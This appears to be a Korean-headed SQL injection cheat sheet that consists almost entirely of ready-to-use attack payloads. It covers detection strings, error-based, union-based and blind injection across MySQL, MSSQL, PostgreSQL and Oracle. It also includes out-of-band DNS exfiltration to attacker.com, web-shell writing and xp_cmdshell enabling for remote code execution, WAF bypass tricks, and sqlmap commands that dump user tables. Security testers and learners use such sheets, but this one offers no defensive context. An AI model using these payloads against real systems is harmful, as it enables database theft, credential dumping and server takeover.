# SQL Injection — 페이로드 & 기법

## 기본 탐지
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR 'x'='x
```

## Error-based (MySQL)
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Error-based (MSSQL)
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=(SELECT 1/0)--
'; DECLARE @q NVARCHAR(4000); SET @q=0x73656c656374...EXEC(@q)--
```

## Union-based
```sql
' ORDER BY 1--
' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,3 FROM users--
```

## Blind Boolean-based
```sql
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND (SELECT COUNT(*) FROM users)>0--
```

## Blind Time-based
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

## Out-of-band (DNS exfil)
```sql
-- MySQL (Windows, FILE priv 필요)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\a'--
'; EXEC master..xp_fileexist '\\attacker.com\a'--
```

## RCE via SQLi
```sql
-- MySQL (INTO OUTFILE)
' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL xp_cmdshell
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

## WAF 우회
```sql
-- 공백 대체
/**/  %09  %0a  %0d  %a0
'/**/UNION/**/SELECT/**/1,2,3--

-- 대소문자 혼용
UnIoN SeLeCt

-- 인코딩
%27 ('), %2D%2D (--)
0x61646d696e (hex)

-- 이중 인코딩
%2527 → %27 → '

-- 주석 분리
UN/**/ION SEL/**/ECT

-- 과학적 표기
1e0 → 1
```

## sqlmap 기본
```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page?id=1" --level=5 --risk=3
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between
sqlmap -u "http://target/" --data="user=1&pass=2" -p user
sqlmap -u "http://target/" --cookie="PHPSESSID=abc" --level=2
sqlmap -r request.txt --dbs   # Burp 요청 파일
```

## DB별 핑거프린팅
```sql
-- MySQL
SELECT @@version
SELECT user()
SELECT database()

-- MSSQL
SELECT @@version
SELECT SYSTEM_USER
SELECT DB_NAME()

-- Oracle
SELECT banner FROM v$version
SELECT user FROM dual

-- PostgreSQL
SELECT version()
SELECT current_user
SELECT current_database()

-- SQLite
SELECT sqlite_version()
```
